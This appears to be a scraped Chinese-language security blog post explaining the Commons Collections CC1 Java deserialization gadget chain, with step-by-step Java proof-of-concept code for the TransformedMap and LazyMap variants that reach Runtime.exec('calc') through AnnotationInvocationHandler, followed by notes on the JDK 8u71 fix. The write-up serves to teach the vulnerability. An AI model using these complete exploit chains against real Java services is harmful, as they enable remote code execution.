protected Object transformKey(Object object) { if (keyTransformer == null) { return object; } return keyTransformer.transform(object); } protected Object transformValue(Object object) { if (valueTransformer == null) { return object; } return valueTransformer.transform(object); } protected Map transformMap(Map map) { if (map.isEmpty()) { return map; } Map result = new LinkedMap(map.size()); for (Iterator it = map.entrySet().iterator(); it.hasNext(); ) { Map.Entry entry = (Map.Entry) it.next(); result.put(transformKey(entry.getKey()), transformValue(entry.getValue())); } return result; } //这里直接调用了 valueTransformer.transform(value) protected Object checkSetValue(Object value) { return valueTransformer.transform(value); } protected boolean isSetValueChecking() { return (valueTransformer != null); } //----------------------------------------------------------------------- public Object put(Object key, Object value) { key = transformKey(key); value = transformValue(value); return getMap().put(key, value); } public void putAll(Map mapToCopy) { mapToCopy = transformMap(mapToCopy); getMap().putAll(mapToCopy); } } 因为构造函数是 protected，我们不能直接实例化传参，所以找到一个公共方法 decorate ，外部调用它就能 new 出一个 TransformedMap 实例， 创建出一个 TransformedMap 对象，并把自己的 Transformer 塞进去，然后通过调用 checkSetValue() 触发 Transformer 。\njava\r1 2 3 4 5 6 InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}); HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); //用 decorate 包装这个 map //第二个参数 null ：不对 key 做变换 //第三个参数 invokerTransformer ：对 value 做变换（关键） Map\u0026lt;Object,Object\u0026gt; transformedmap = TransformedMap.decorate(map, null, invokerTransformer); 接下来找谁调用了 checkSetValue()\n在 AbstractInputCheckedMapDecorator.****MapEntry.setValue() 调用了 checkSetValue() 方法\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 /** * Implementation of a map entry that checks additions via setValue. */ //定义了一个静态内部类 MapEntry，它继承自 AbstractMapEntryDecorator static class MapEntry extends AbstractMapEntryDecorator { /** The parent map */ //声明了一个不可变（final）字段 parent，类型是 AbstractInputCheckedMapDecorator private final AbstractInputCheckedMapDecorator parent; //构造器接收两个参数 protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) { super(entry); this.parent = parent; } public Object setValue(Object value) { value = parent.checkSetValue(value); return entry.setValue(value); } } } MapEntry 是一个包装器，把原始 Map.Entry 包起来，目的就是在 setValue(...) 时插入一次 “由 parent 执行的检查/变换”（即调用 parent.checkSetValue(...)）。 也就是说：任何通过这个包装的 Entry 调用 setValue 的操作，都会先经由 parent 的 checkSetValue，再回到底层 entry。 当执行 entry.setValue(value) 时，他先调用 checkSetValue(value)，而 checkSetValue(value) 直接调用了 transform 。\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}); HashMap\u0026lt;Object,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;gxngxngxn\u0026#34;,\u0026#34;gxngxngxn\u0026#34;); //给map一个键值对，方便遍历 //用 decorate 包装这个 map；第二个参数 null ：不对 key 做变换；第三个参数 invokerTransformer ：对 value 做变换（关键） Map\u0026lt;Object,Object\u0026gt; transformedmap = TransformedMap.decorate(map, null, invokerTransformer); for(Map.Entry entry:transformedmap.entrySet()) { //调用 entry.setValue(r)，这里传入的是 Runtime r 对象 //但是在 MapEntry.setValue 里，会先执行parent.checkSetValue() //checkSetValue(value) 内部会执行 return valueTransformer.transform(value); //所以传进来的 r 会被 invokerTransformer.transform(r) 处理 entry.setValue(r); } 通过上述测试，说明这条链是能打通的，触发条件是手动遍历了 transformedmap，这不是真正的利用链，接下来要去找 readObject 来触发漏洞。\n同样的，查找哪个方法调用了 setValue ，最好是重写的 readObject 。\n在 AnnotationInvocationHandler 类的 readObject 方法里调用了 setValue 方法\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } //获取注解里每个成员的类型（方法名：返回类型） Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class\u0026lt;?\u0026gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); //检查当前值是否与成员类型匹配，或者是不是 ExceptionProxy if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { //如果不匹配，就调用：memberValue.setValue memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \u0026#34;[\u0026#34; + value + \u0026#34;]\u0026#34;).setMember( annotationType.members().get(name))); } } } } memberValues 也是可控的\n1.3 构造 POC \u0026amp; 遇到的问题： 初步构造：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CC1Test { public static void main(String[] args) throws Exception{ Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(\u0026#34;key\u0026#34;, \u0026#34;value\u0026#34;); Map\u0026lt;Object, Object\u0026gt; transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer); Class c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class); aihConstructor.setAccessible(true); Object o = aihConstructor.newInstance(Override.class, transformedMap); // 序列化反序列化 serialize(o); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 但目前还不能成功利用，有三个问题需解决：\nRuntime 对象不可序列化，需要通过反射将其变成可以序列化的形式 反射解决：\n先写普通反射：\njava\r1 2 3 4 5 Class c = Runtime.class; Method method = c.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime runtime = (Runtime) method.invoke(null, null); Method run = c.getMethod(\u0026#34;exec\u0026#34;, String.class); run.invoke(runtime, \u0026#34;calc\u0026#34;); 然后改为 InvokerTransformer 调用：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Class c = Runtime.class; Method m = (Method) new InvokerTransformer( \u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null} ).transform(Runtime.class); Runtime r = (Runtime) new InvokerTransformer( \u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null} ).transform(m); new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;} ).transform(r); 由于一个一个调用 transform 太繁琐，我们使用 ChainedTransformer 类进行简化：\nChainedTransformer 类下的 transform 方法递归调用了前一个方法的结果，作为后一个方法的参数\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 public class CC1Test { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new InvokerTransformer( \u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null} ), new InvokerTransformer( \u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null} ), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;} ) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); //chainedTransformer.transform(Runtime.class); HashMap map = new HashMap(); map.put(\u0026#34;key\u0026#34;, \u0026#34;value\u0026#34;); Map\u0026lt;Object, Object\u0026gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Class\u0026lt;Runtime\u0026gt; runtimeClass = Runtime.class; Class\u0026lt;?\u0026gt; c1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Override.class, transformedMap); serialize(o); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 这样就解决了第一个问题。\nAnnotationInvocationHandler类中的判断条件 通过调试发现，memberType = null 所以不进入 if 判断，无法调用 setValue\nmemberType 是获取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称，\n点进 Override，我们所使用的注解是没有成员变量的\n而点进 Target 发现其符合我们的需求\n修改POC：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); //修改参数 hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;value\u0026#34;); Map\u0026lt;Object, Object\u0026gt; transformedMap = TransformedMap.decorate(hashMap, null , chainedTransformer); Class\u0026lt;?\u0026gt; c1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); //改传参注解为：Target Object o = constructor.newInstance(Target.class, transformedMap); serialize(o); unserialize(\u0026#34;ser.bin\u0026#34;); 这时 memberType 已经不为空了。\nsetValue 传参固定 继续跟进时，发现setValue 传入的值不是 Runtime.class ，\n这里就需要 ConstantTransformer 类，ConstantTransformer 方法将传入的对象放入 iConstant中，transform() 方法无论传入什么，都返回 iConstant，完美符合要求。\n修改POC：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 public class CC1Test { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ //添加： new ConstantTransformer(Runtime.class), new InvokerTransformer( \u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null} ), new InvokerTransformer( \u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null} ), new InvokerTransformer( \u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;} ) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); //chainedTransformer.transform(Runtime.class); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;value\u0026#34;); Map\u0026lt;Object, Object\u0026gt; transformedMap = TransformedMap.decorate(hashMap, null , chainedTransformer); Class\u0026lt;?\u0026gt; c1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Target.class, transformedMap); serialize(o); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 1.4 最终 POC ： java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 public class CC1Test { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); //chainedTransformer.transform(Runtime.class); HashMap\u0026lt;Object, Object\u0026gt; hashMap = new HashMap\u0026lt;\u0026gt;(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;value\u0026#34;); Map\u0026lt;Object, Object\u0026gt; transformedMap = TransformedMap.decorate(hashMap, null , chainedTransformer); Class\u0026lt;?\u0026gt; c1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object o = constructor.newInstance(Target.class, transformedMap); serialize(o); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 1.5 总结 transform 方法，可以把一个对象转换成另一个对象， 但是，在实现类里把 transform 变成“可以执行任意逻辑”时，就出现了漏洞。我们发现 InvokerTransformer 实现了 Transformer 接口并且有 transform 方法，\n接着找到 TransformedMap 类中的 checkSetValue 方法调用了 transform 方法；\n之后找到 AbstractInputCheckedMapDecorator 类中的 setValue 方法调用了 checkSetValue方法，\n通过测试这条链是没问题的，那么接下来的目标就是寻找一个入口点 ，查找哪个方法调用了 setValue ，最好是重写的 readObject，通过 readObject 来触发漏洞。\n找到 AnnotationInvocationHandler 类中的 readObject 方法存在 setValue，需要注意的是 readObject 不是直接调用 ·，\nreadObject 方法在反序列化时，会从序列化数据中恢复 memberValues（一个 Map），而这个 Map 的内容完全取决于攻击者传入的序列化流。攻击者可以在这里替换成 TransformedMap，从而把恶意 Transformer 链接进来。\n通过对 readObject 的调试，知道了 readObject 如何触发 setValue ：\n在反序列化时，AnnotationInvocationHandler.readObject 会去恢复 memberValues 里的数据。它遍历 memberValues.entrySet() 时，取到的 MapEntry 会调用 setValue 来写入值。也就是说：反序列化时，readObject 间接触发了 MapEntry.setValue。\n完整的利用链思路：\nAnnotationInvocationHandler.readObject\nmemberValue.setValue\nMapEntry.setValue\nparent.checkSetValue\nTransformedMap.checkSetValue\nvalueTransform.transform\nChainedTransformer.transform\nConstantTransformer.transform\nInvokerTransformer.transform\nreadObject 在反序列化时会恢复 memberValues（一个 Map）,\n由于攻击者可控，这个 Map 可以被替换为 TransformedMap，\n当 readObject 遍历 memberValues.entrySet() 时，会触发 MapEntry.setValue，\nsetValue 会调用 checkSetValue，而 checkSetValue 又会调用 valueTransform.transform，\n这里的 valueTransform 实际上是 ChainedTransformer，它会依次执行其中的 ConstantTransformer 和 InvokerTransformer，\n最终 InvokerTransformer.transform 会调用任意方法，从而实现代码执行。\n2、 LazyMap 版 2.1 分析利用链 首先找到 LazyMap 类中的 get 方法中有 transform 方法。\n找 factory ：Transformer\n由于此处的构造方法同样为 protected ，还是利用静态方法 decorate 传参\n继续找谁调用了 LayMap.get()\n在 AnnotationInvocationHandler 类中的 invoke 方法调用了 get\n同时这个类也有 TransformedMap 中用到的 readObject 方法\n要触发 AnnotationInvocationHander.invoke，用到动态代理\n2.2 编写 EXP java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC1Test02 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IOException, InvocationTargetException, InstantiationException, IllegalAccessException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); //chainedTransformer.transform(Runtime.class); HashMap map = new HashMap(); //首先用 LazyMap 替换 TransformedMap Map lazyMap = LazyMap.decorate(map, chainedTransformer); //对 sun.reflect.annotation.AnnotationInvocationHandler 对象进行 Proxy Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); //利用反射创建了一个 AnnotationInvocationHandler 对象；它内部的 memberValues 是 LazyMap InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap); //创建动态代理对象 proxyMap，当有人对这个 proxyMap 调用 Map 的任意方法，会进入 AnnotationInvocationHandler.invoke(...) Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); //因为 proxyMap 自己序列化 /反序列化不会触发链子；只有 AnnotationInvocationHandler 的反序列化过程才会去主动访问 memberValues //把 proxyMap 塞进一个新的 AnnotationInvocationHandler 的 memberValues 字段里，让它在 readObject() 时被调用 Object o = constructor.newInstance(Retention.class, proxyMap); serialize(o); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 2.3 问题 未执行到 readObject 就弹出计算器 《Java 安全漫谈》\n在使用Proxy代理了map对象后，我们在任何地方执行map的方法就会触发Payload弹出计算器，所\n以，在本地调试代码的时候，因为调试器会在下面调用一些toString之类的方法，导致不经意间触发了\n命令。\n解决办法有 ：\n设置 - 构建、执行、部署 - 调试器 - 数据视图 - Java\n关闭：\n启用集合类的替代视图\n启用\u0026rsquo;toStringO’对象视图\n2.4 总结 漏洞原理：\nLazyMap.decorate(Map, Transformer) 包装一个底层 Map。 当调用 get(key) 时，如果 key 不存在，就会调用 transformer.transform(key) 生成值并返回 利用链：\nAnnotationInvocationHandler.readObject\nAnnotationInvocationHandler.invoke\nmemberValues.get\nLazyMap.get\nLazyMap.get.factor.transform\nChainedTransformer.transform\nConstantTransformer.transform\nInvokerTransformer.transform\n漏洞修复： 1、TransformedMap TransformedMap 在 Java 8u71 以上的版本就不可以使用了。\n首先梳理一下 TransformedMap 利用链的逻辑：\nTransformedMap.decorate 包装了一个 Map，并设置了一个恶意 Transformer，TransformedMap 在调用Map.Entry.setValue 的时候，会触发 transformer.transform(value)，在 gadget 链里，利用 AnnotationInvocationHandler 的反序列化逻辑，最终会调用到 Map.Entry.setValue，触发恶意代码。\n而利用 AnnotationInvocationHandler 主要用的是 readObject方法的反序列化操作，\n在 Java 8u71 之前： readObject方法在反序列化时会遍历 Map 中的 entry，调用 entry.setValue() 来调整键值。于是恶意的 TransformedMap entry 会被调用 setValue，从而执行 transform()。\n在 Java 8u71 之后： https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d\n新建一个LinkedHashMap，对值的修正，改成了 value = new ...，而不是直接调用entry.setValue，后续的操作都是针对LinkedHashMap。这样一来，streamVals就不会去调用 setValue，它只是作为一个输入被读取了一遍，然后就进入了LinkedHashMap，不会触发恶意方法。\n所以说，漏洞的修复和 setValue关系不大，\n《Java 安全漫谈》\n对于这次修改，有些文章说是因为没有了setValue，其实原因和setValue关系不大。改动后，不再直接\n使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。\n所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执\n行set或put操作，也就不会触发RCE了。\n2、 LazyMap 原来 readObject 会通过 memberValues.get(name) 或者 entry.setValue(...) 间接调用 Map 的查找/写入方法，现在改为遍历反序列化出来的 streamVals.entrySet()、直接读取 entry.getValue() 并把值复制到一个新的 LinkedHashMap，然后用 Unsafe 直接在内存里把对象字段的引用一次性写入 。这样就切断了触发 LazyMap.transform 的路径。\n","permalink":"http://localhost:1313/xvsf/posts/cc1/","summary":"\u003ch1 id=\"环境\"\u003e环境\u003c/h1\u003e\n\u003ch2 id=\"1jdk-8u65\"\u003e1、JDK-8u65\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html?utm_source=chatgpt.com\"\u003ehttps://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e注意：国家不要选为国区，国区对应的 8u65 下载的时候会自动下载 8u111 等高版本！\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg decoding=\"async\" loading=\"lazy\" src=\"https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805704.png\" style=\"max-width: 100%; height: auto;\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg decoding=\"async\" loading=\"lazy\" src=\"https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805734.png\" style=\"max-width: 100%; height: auto;\"\u003e\u003c/p\u003e\n\u003ch2 id=\"2maven-commons-collections-321\"\u003e2、Maven-commons-collections 3.2.1\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1\"\u003ehttps://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"code-block-container\" data-expanded=\"true\"\u003e\r\n    \u003cdiv class=\"code-header\"\u003e\r\n        \u003cdiv class=\"mac-buttons\"\u003e\r\n            \u003cspan class=\"mac-button red\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button yellow\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button green\"\u003e\u003c/span\u003e\r\n        \u003c/div\u003e\r\n        \u003cspan class=\"code-language\"\u003exml\u003c/span\u003e\r\n        \u003cdiv class=\"code-actions\"\u003e\r\n            \u003cbutton class=\"copy-btn\" title=\"Copy\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"\u003e\u003crect x=\"9\" y=\"9\" width=\"13\" height=\"13\" rx=\"2\" ry=\"2\"\u003e\u003c/rect\u003e\u003cpath d=\"M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1\"\u003e\u003c/path\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n            \u003cbutton class=\"toggle-btn\" title=\"Toggle\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"feather feather-chevron-down\"\u003e\u003cpolyline points=\"6 9 12 15 18 9\"\u003e\u003c/polyline\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n        \u003c/div\u003e\r\n    \u003c/div\u003e\r\n    \u003cdiv class=\"code-content\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv class=\"chroma\"\u003e\n\u003ctable class=\"lntable\"\u003e\u003ctr\u003e\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode\u003e\u003cspan class=\"lnt\" id=\"1\"\u003e\u003ca class=\"lnlinks\" href=\"#1\"\u003e1\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"2\"\u003e\u003ca class=\"lnlinks\" href=\"#2\"\u003e2\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"3\"\u003e\u003ca class=\"lnlinks\" href=\"#3\"\u003e3\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"4\"\u003e\u003ca class=\"lnlinks\" href=\"#4\"\u003e4\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"5\"\u003e\u003ca class=\"lnlinks\" href=\"#5\"\u003e5\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"6\"\u003e\u003ca class=\"lnlinks\" href=\"#6\"\u003e6\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e\u0026lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dependency\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;groupId\u0026gt;\u003c/span\u003ecommons-collections\u003cspan class=\"nt\"\u003e\u0026lt;/groupId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;artifactId\u0026gt;\u003c/span\u003ecommons-collections\u003cspan class=\"nt\"\u003e\u0026lt;/artifactId\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;version\u0026gt;\u003c/span\u003e3.2.1\u003cspan class=\"nt\"\u003e\u0026lt;/version\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dependency\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003c/div\u003e\r\n\u003c/div\u003e\u003ch2 id=\"3修改-sun-包-方便调试\"\u003e3、修改 sun 包-方便调试\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4\"\u003ehttps://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4\u003c/a\u003e\u003c/p\u003e","title":"CC1"},{"content":"Java 反序列化 1、序列化与反序列化 1.1 什么是序列化\u0026amp;反序列化 序列化：将内存中的对象压缩成字节流\n反序列化：将字节流转化成内存中的对象\n1.2 为什么有序列化技术 序列化与反序列化的设计就是用来传输数据的。\n应用场景\n(1) 想把内存中的对象保存到一个文件中或者是数据库当中。\n(2) 用套接字在网络上传输对象。\n(3) 通过RMI传输对象的时候。\n1.3 几种常见的序列化和反序列化协议 XML SOAP（Simple Object Access protocol） 是一种被广泛应用的，基于 XML 为序列化和反序列化协议的结构化消息传递协议 JSON（Javascript Object Notation） Protobuf 1.4 序列化和反序列化实现 简单分析 Java 的对象序列化的不同写法：\n俩种写法本质上都是 Java 的对象序列化，但它们在底层的 IO 